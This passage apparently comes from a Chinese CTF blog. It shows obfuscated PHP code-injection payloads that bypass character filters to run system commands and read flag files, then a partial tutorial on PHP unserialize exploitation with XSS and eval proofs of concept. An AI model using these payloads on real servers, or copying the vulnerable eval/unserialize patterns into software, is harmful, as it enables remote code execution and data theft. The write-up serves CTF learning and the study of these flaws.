<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">((%<span class="number">8</span>f%<span class="number">8</span>d%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>b%a0%<span class="number">8</span>d)^(%ff%ff%ff%ff%ff%ff%ff))(((%<span class="number">8</span>c%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">91</span>%<span class="number">9</span>b%<span class="number">96</span>%<span class="number">8</span>d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br><span class="line">//print_r(scandir(<span class="string">&#x27;.&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>count_charsè¿‡ä¸å»ï¼Œéœ€è¦ç¼©å‡å­—ç¬¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">((%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>c)^(%<span class="number">9</span>b%<span class="number">8</span>f%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>c%<span class="number">9</span>b%<span class="number">8</span>f)^(%<span class="number">8</span>f%<span class="number">9</span>e%<span class="number">96</span>%<span class="number">96</span>%<span class="number">8</span>c%a0%<span class="number">9</span>e)^(%ff%ff%ff%ff%ff%ff%ff))(((%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>c)^(%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>c%a0%<span class="number">9</span>b%<span class="number">8</span>f)^(%<span class="number">8</span>c%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">96</span>%a0%<span class="number">96</span>%<span class="number">9</span>e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; index.php [3] =&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt ) </span><br></pre></td></tr></table></figure>

<p>è¯»æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">((%<span class="number">8</span>d%<span class="number">9</span>c%<span class="number">97</span>%a0%<span class="number">88</span>%<span class="number">8</span>d%<span class="number">97</span>%<span class="number">8</span>d%<span class="number">9</span>c%a0%a0)^(%<span class="number">9</span>a%<span class="number">97</span>%<span class="number">9</span>b%<span class="number">88</span>%a0%<span class="number">9</span>a%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">8</span>d%<span class="number">9</span>c%<span class="number">9</span>a)^(%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>c%a0%<span class="number">88</span>%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>c%<span class="number">9</span>c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%<span class="number">97</span>%<span class="number">8</span>d)^(%<span class="number">9</span>a%<span class="number">9</span>a%<span class="number">9</span>b)^(%a0%<span class="number">9</span>c%<span class="number">8</span>d)^(%ff%ff%ff))(((%<span class="number">8</span>d%a0%<span class="number">88</span>%<span class="number">97</span>%<span class="number">8</span>d%<span class="number">9</span>b%<span class="number">9</span>c)^(%<span class="number">9</span>a%<span class="number">9</span>c%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">9</span>b%<span class="number">9</span>a%<span class="number">8</span>d)^(%<span class="number">9</span>b%a0%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">8</span>d%<span class="number">97</span>%<span class="number">9</span>c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br><span class="line">//show_source(end(scandir(.)));</span><br></pre></td></tr></table></figure>

<h2 id="ä¾‹å­ä¸‰"><a href="#ä¾‹å­ä¸‰" class="headerlink" title="ä¾‹å­ä¸‰"></a><strong>ä¾‹å­ä¸‰</strong></h2><p>ç¬¬äº”ç©ºé—´hate-php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(f|l|a|g|\.|p|h|\/|;|\&quot;|\&#x27;|\`|\||\[|\]|\_|=)/i&#x27;</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You are too good for me&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;You deserve better&#x27;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªæ­£åˆ™è¿‡æ»¤äº†ä¸€äº›ç¬¦å·äº†flag.phä¸­ä»»æ„çš„å­—ç¬¦ï¼Œç¬¬äºŒä¸ª<code>foreach</code>è¿‡æ»¤äº†æ‰€æœ‰å†…ç½®å‡½æ•°</p>
<ul>
<li>exp1</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?code=(~%8C%86%8C%8B%9A%92)($&#123;%a7%ae%ac%ac^%f8%e9%e9%f8&#125;&#123;%a7&#125;)&amp;%a7=cat%20flag.php</span><br><span class="line">//system(&#123;_GET&#125;&#123;%a7&#125;)&amp;%a7=cat%<span class="number">20</span>flag.php</span><br></pre></td></tr></table></figure>

<ul>
<li>exp2</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?code=$&#123;~%a0%b8%ba%ab&#125;&#123;%a0&#125;($&#123;~%a0%b8%ba%ab&#125;&#123;%a1&#125;)&amp;%a0=highlight_file&amp;%a1=flag.php</span><br><span class="line">//?code=$&#123;_GET&#125;&#123;%a0&#125;($&#123;_GET&#125;&#123;%a1&#125;)&amp;%a0=highlight_file&amp;%a1=flag.php</span><br></pre></td></tr></table></figure>

<ul>
<li>exp3</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?code=(~(%8c%86%8c%8b%9a%92))((~(%9a%91%9b))((~(%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c))()))</span><br><span class="line">//?code=(system)((end)((getallheaders)()))</span><br><span class="line">//?code=system(end(getallheaders()))</span><br><span class="line">//éœ€è¦è¯·æ±‚å¤´æ·»åŠ </span><br><span class="line">kawhi: cat flag.php</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;evil&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_GET[<span class="string">&#x27;evil&#x27;</span>])&gt;<span class="number">25</span>||preg_match(<span class="string">&quot;/[\w$=()&lt;&gt;&#x27;\&quot;]/&quot;</span>, $_GET[<span class="string">&#x27;evil&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;danger!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;evil&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?evil&#x3D;&#96;.+&#x2F;???&#x2F;????????[@-[]&#96;; HTTP&#x2F;1.1</span><br><span class="line">Host: 47.98.234.232:28000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Linux; Android 10; VOG-AL10 Build&#x2F;HUAWEIVOG-AL10; wv) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Version&#x2F;4.0 Chrome&#x2F;77.0.3865.120 MQQBrowser&#x2F;6.2 TBS&#x2F;045331 Mobile Safari&#x2F;537.36 MMWEBID&#x2F;9471 MicroMessenger&#x2F;7.0.19.1760(0x27001339) Process&#x2F;tools WeChat&#x2F;arm64 NetType&#x2F;WIFI</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------367263770318294676713873117171</span><br><span class="line">Content-Length: 241</span><br><span class="line">Origin: http:&#x2F;&#x2F;106.55.148.151:31002</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;106.55.148.151:31002&#x2F;index.php?file&#x3D;abc.txt</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">-----------------------------367263770318294676713873117171</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file1&quot;; filename&#x3D;&quot;abc.txt&quot;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">ls &#x2F; &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;hello</span><br><span class="line">-----------------------------367263770318294676713873117171--</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
  </entry>
  <entry>
    <title>ååºåˆ—åŒ–æ¼æ´æ€»ç»“</title>
    <url>/2020/05/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>æœ€è¿‘åœ¨buuåˆ·é¢˜ï¼Œé‡åˆ°åˆ°äº†ä¸€äº›å…³äºååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œè¿™é‡Œåšä¸€ä¸ªæ€»ç»“ã€‚</p>
<h1 id="PHPååºåˆ—åŒ–æ¼æ´"><a href="#PHPååºåˆ—åŒ–æ¼æ´" class="headerlink" title="PHPååºåˆ—åŒ–æ¼æ´"></a><strong>PHPååºåˆ—åŒ–æ¼æ´</strong></h1><h2 id="åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h2><blockquote>
<p>æ‰€æœ‰phpé‡Œé¢çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨å‡½æ•°serialize()æ¥è¿”å›ä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²æ¥è¡¨ç¤ºã€‚unserialize()å‡½æ•°èƒ½å¤Ÿé‡æ–°æŠŠå­—ç¬¦ä¸²å˜å›phpåŸæ¥çš„å€¼ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¼šä¿å­˜ç±»çš„åå­—ã€‚ â€”â€”phpå®˜æ–¹æ–‡æ¡£</p>
</blockquote>
<p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯å¦‚æœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œä¸”åå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°ï¼Œå°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚</p>
<p>æˆ‘ä»¬é€šå¸¸æŠŠ<strong>å­—ç¬¦ä¸²/æ•°ç»„/å¯¹è±¡</strong>è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åå†ååºåˆ—åŒ–è¢«åºåˆ—åŒ–çš„<strong>å­—ç¬¦ä¸²/æ•°ç»„/å¯¹è±¡</strong>ã€‚</p>
<p>é¦–å…ˆä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­</p>
<img src="http://img.kawhi.xyz/image-20200711120132680.png" style="high:80%;width:80%;" />

<p><strong>åˆ†æä¸€ä¸‹åºåˆ—åŒ–ä¹‹åçš„å«ä¹‰</strong></p>
<p><strong>å­—ç¬¦ä¸²ï¼š</strong></p>
<p><code>$a=&quot;test&quot;;</code> åºåˆ—åŒ–åçš„ç»“æœæ˜¯<code>s:4:&quot;test&quot;;</code></p>
<p>å…¶ä¸­sä»£è¡¨stringç±»å‹ï¼Œ4ä»£è¡¨å­—ç¬¦ä¸²é•¿åº¦ï¼Œâ€testâ€ä»£è¡¨å­—ç¬¦ä¸²å†…å®¹ã€‚</p>
<p><strong>æ•°ç»„ï¼š</strong></p>
<p><code>$arr = array(&#39;c&#39; =&gt; &#39;cat&#39; ,&#39;d&#39;=&gt; &#39;dog&#39;);</code>åºåˆ—åŒ–åçš„ç»“æœæ˜¯<code>a:2:&#123;s:1:&quot;c&quot;;s:3:&quot;cat&quot;;s:1:&quot;d&quot;;s:3:&quot;dog&quot;;&#125;</code></p>
<p>å…¶ä¸­aä»£è¡¨arrayæ•°ç»„ç±»å‹,2ä»£è¡¨æ•°ç»„é•¿åº¦ä¸º2ä¸ªï¼Œsä»£è¡¨stringï¼Œ3ä»£è¡¨å­—ç¬¦ä¸²é•¿åº¦ï¼Œcatæ˜¯å­—ç¬¦ä¸²å†…å®¹ï¼Œä¾æ­¤ç±»æ¨ã€‚</p>
<p><strong>å¯¹è±¡ï¼š</strong></p>
<p><code>class ABC&#123;public $name=&quot;kawhi&quot; ;&#125;</code>åˆ›å»ºå¯¹è±¡åï¼Œåºåˆ—åŒ–åçš„ç»“æœæ˜¯<code>O:3:&quot;ABC&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;kawhi&quot;;&#125;</code></p>
<p>å…¶ä¸­Oè¡¨ç¤ºå­˜å‚¨çš„å¯¹è±¡(objectç±»å‹)ï¼Œ3ä»£è¡¨å¯¹è±¡åç§°æœ‰3ä¸ªå­—ç¬¦ï¼Œå³ABCï¼Œ1è¡¨ç¤ºæœ‰ä¸€ä¸ªå€¼ï¼Œsä»£è¡¨stringç±»å‹ï¼Œ4ä»£è¡¨å­—ç¬¦ä¸²é•¿åº¦ï¼Œnameä»£è¡¨å­—ç¬¦ä¸²åç§°ï¼Œä¾æ­¤ç±»æ¨ã€‚</p>
<p>å¦‚æœåœ¨è¢«åºåˆ—åŒ–çš„å¯¹è±¡ä¸­åŠ å…¥ä¸€äº›æ¶æ„çš„ä»£ç ï¼Œå¦‚XSSå¼¹çª—ï¼Œé‚£ä¹ˆåœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±ç›¸å½“äºè§£ç æ“ä½œï¼Œç„¶åä¼šè‡ªåŠ¨æ‰§è¡Œã€‚</p>
<img src="http://img.kawhi.xyz/image-20200711121735182.png" style="high:80%;width:80%;" />

<h2 id="ç»“åˆé­”æ³•å‡½æ•°æ„é€ pocé“¾"><a href="#ç»“åˆé­”æ³•å‡½æ•°æ„é€ pocé“¾" class="headerlink" title="ç»“åˆé­”æ³•å‡½æ•°æ„é€ pocé“¾"></a><strong>ç»“åˆé­”æ³•å‡½æ•°æ„é€ pocé“¾</strong></h2><p>é€šå¸¸æ¥è¯´æœ‰ä¸€äº›PHPçš„é­”æ³•å‡½æ•°ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ï¼Œå¦‚ï¼š</p>
<p><code>__construct</code> å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨</p>
<p><code>__wakeup</code> ä½¿ç”¨unserialse()å‡½æ•°æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨</p>
<p><code>__destruct</code> å½“å¯¹è±¡è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ (phpç»å¤§å¤šæ•°æƒ…å†µä¸‹ä¼šè‡ªåŠ¨è°ƒç”¨é”€æ¯å¯¹è±¡)</p>
<p><code>__toString</code> å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚</p>
<p><code>__sleep()</code> ä½¿ç”¨serialize()å‡½æ•°æ—¶è§¦å‘</p>
<p><code>__call()</code>  åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ </p>
<p><code>__callStatic()</code> åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</p>
<p><code>__get()</code> ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</p>
<p><code>__set()</code> ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</p>
<p><code>__isset()</code> åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ </p>
<p><code>__unset()</code> åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</p>
<p><code>__toString()</code> æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘,è¿”å›å€¼éœ€è¦ä¸ºå­—ç¬¦ä¸²</p>
<p><code>__invoke()</code> å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</p>
<p>è¿™é‡Œå†çœ‹çœ‹ä¸€äº›å¸¸ç”¨çš„é­”æœ¯æ˜¯å¦‚ä½•è¢«è°ƒç”¨çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $varr1 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $varr2 = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> test();<span class="comment">//å®ä¾‹åŒ–å¯¹è±¡ï¼Œè°ƒç”¨__construct()æ–¹æ³•ï¼Œè¾“å‡º__construct</span></span><br><span class="line">$obj-&gt;echoP();    <span class="comment">//è°ƒç”¨echoP()æ–¹æ³•ï¼Œè¾“å‡º&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> $obj;        <span class="comment">//objå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²è¾“å‡ºï¼Œè°ƒç”¨__toString()æ–¹æ³•ï¼Œè¾“å‡º__toString</span></span><br><span class="line">$s =serialize($obj);   <span class="comment">//objå¯¹è±¡è¢«åºåˆ—åŒ–ï¼Œè°ƒç”¨__sleep()æ–¹æ³•ï¼Œè¾“å‡º__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize($s);  <span class="comment">//$sé¦–å…ˆä¼šè¢«ååºåˆ—åŒ–ï¼Œä¼šè°ƒç”¨__wake()æ–¹æ³•ï¼Œè¢«ååºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡åˆè¢« å½“åšå­—ç¬¦ä¸²ï¼Œå°±ä¼šè°ƒç”¨_toString()æ–¹æ³•ã€‚ // è„šæœ¬ç»“æŸåˆä¼šè°ƒç”¨__destruct()æ–¹æ³•ï¼Œè¾“å‡º__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸¾ä¸€ä¸ª<code>__wakeup</code>çš„ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;kawhi&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å…¶ä¸­ååºåˆ—åŒ–çš„aå˜é‡æ˜¯å¯æ§çš„ï¼Œå¹¶ä¸”ä¸€æ—¦ååºåˆ—åŒ–ä¼šè‡ªåŠ¨æ‰§è¡Œé­”æ³•æ–¹æ³•<code>__wakeup</code>å¹¶ä¸”è¾“å‡ºtestã€‚</p>
<p>æ„é€ pocæ’å…¥xss</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> A();</span><br><span class="line">$c = serialize($c);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125;</code></p>
<img src="http://img.kawhi.xyz/image-20200711123022767.png" style="high:80%;width:80%;" />

<p>å¯ä»¥çœ‹åˆ°ç›´æ¥å¯¼è‡´xssæ”»å‡»ï¼Œå¦‚æœ<code>__wakeup</code>ä¸­ä¸æ˜¯<code>echo()</code>ï¼Œè€Œæ˜¯<code>eval()</code>é‚£ä¹ˆå°±æ˜¯ä»»æ„ä»£ç æ‰§è¡Œï¼Œå±å®³å°±æ›´å¤§äº†ã€‚</p>
<p>æŠŠ<code>echo()</code>ä¿®æ”¹ä¸º<code>eval()</code>ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;kawhi&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p>
<p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸæ‰§è¡Œphpä»£ç ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200711123529023.png" style="high:80%;width:80%;" />

<h2 id="ä¸€äº›çŸ¥è¯†ç‚¹"><a href="#ä¸€äº›çŸ¥è¯†ç‚¹" class="headerlink" title="ä¸€äº›çŸ¥è¯†ç‚¹"></a><strong>ä¸€äº›çŸ¥è¯†ç‚¹</strong></h2><h3 id="wakeupç»•è¿‡"><a href="#wakeupç»•è¿‡" class="headerlink" title="wakeupç»•è¿‡"></a><strong>wakeupç»•è¿‡</strong></h3><p>è¿™æ˜¯åœ¨æ”»é˜²ä¸–ç•Œåˆ·åˆ°çš„ä¸€é¢˜ï¼Œé€šè¿‡è¿™é“é¢˜è®¤è¯†æ€ä¹ˆç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span 